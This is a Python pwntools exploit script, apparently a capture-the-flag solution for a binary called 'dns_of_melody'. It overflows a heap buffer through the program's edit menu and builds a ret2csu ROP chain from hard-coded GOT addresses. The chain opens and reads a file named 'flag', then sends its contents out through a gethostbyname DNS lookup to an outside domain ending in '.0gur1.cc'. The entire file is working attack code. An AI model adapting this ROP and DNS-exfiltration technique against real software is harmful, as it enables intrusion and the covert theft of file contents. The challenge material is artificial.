from pwn import *
import time
context.log_level='debug'

debug =1
if debug:
	p = process('./dns_of_melody')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote()
	libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')

csu_pop_addr = 0x4012aa
csu_mov_addr = 0x401290
open_got = 0x601FE8
read_got = 0x601FB8
gethost_got = 0x601FD0

def add(host,length):
	p.sendlineafter("Select:\n",'1')
	p.sendlineafter("give me length: \n",str(length))
	p.sendline(host)
def do(idx):
	p.sendlineafter("Select:\n",'2')
	p.sendlineafter("give me index: \n",str(idx))
def edit(idx,content):
	p.sendlineafter("Select:\n",'4')
	p.sendlineafter("give me index: \n",str(idx))
	p.sendline(content)

add('flag',123)#0
add('a'*0x20+'.0gur1.cc',123)#1
do(1)
gdb.attach(p,'b *0x401246')

rop = p64(csu_pop_addr)+p64(0)+p64(1)+p64(open_got)+p64(0)*2+p64(0x602060)+p64(csu_mov_addr)#open
rop += 'padding.'
rop += p64(0)+p64(1)+p64(read_got)+p64(0x20)+p64(0x602060+388)+p64(0)+p64(csu_mov_addr)#read
rop += 'padding.'
rop += p64(0)+p64(1)+p64(gethost_got)+p64(0)*2+p64(0x602060+388)+p64(csu_mov_addr)#gethostbyname
edit(1,'a'*0x190+p64(9)+'a'*16+rop)


p.sendlineafter("Select:\n",'5')
p.interactive()


